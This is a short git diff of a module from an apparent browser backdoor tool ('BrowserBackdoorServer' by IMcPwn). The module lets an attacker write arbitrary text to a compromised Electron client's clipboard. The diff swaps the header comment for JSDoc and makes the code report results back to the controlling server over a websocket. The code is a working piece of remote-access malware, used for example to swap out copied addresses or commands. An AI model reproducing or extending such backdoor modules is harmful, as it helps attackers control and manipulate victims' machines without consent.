@@ -1,19 +1,22 @@
 // INTERACTIVE
-/*
- * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
- * BrowserBackdoorServer by IMcPwn.
- * See the file 'LICENSE' for copying permission
- *
- * Info: Writes text to clipboard
- * Parameters: Text to write to clipboard 
- * Returns: undefined, error
- * Author: IMcPwn
+/**
+ * @file writeClipboard Module
+ * @summary Writes to the client system's clipboard.
+ * @author Carleton Stuberg
+ * @see https://github.com/IMcPwn/browser-backdoor
+ * @license MIT
+ * @version 0.1
  */
 
 electron = require('electron')
 
+/**
+ * @param {String} data - The text to write to the clipboard.
+ * @return {String} "Wrote $data to clipboard"
+ */
 writeClipboard = function (data) {
-    electron.clipboard.writeText(data)
+    electron.clipboard.writeText(data);
+    ws.send("Wrote " + data + " to clipboard");
 }
 
-return "\nUsage: writeClipboard(data)\n- data is the text to write to the clipboard.";
+ws.send("\nUsage: writeClipboard(data)\n- data is the text to write to the clipboard.");
